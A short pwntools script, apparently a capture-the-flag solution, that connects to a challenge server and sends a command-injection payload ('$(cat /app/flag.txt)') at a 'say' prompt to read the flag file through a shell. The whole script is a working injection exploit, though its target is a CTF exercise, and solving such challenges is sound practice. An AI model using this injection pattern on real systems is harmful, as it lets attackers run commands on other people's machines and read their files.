from pwn import *


r = remote("challs.pwnoh.io", 13400)

r.sendlineafter(b'say', b'"$(cat /app/flag.txt)')

r.interactive()
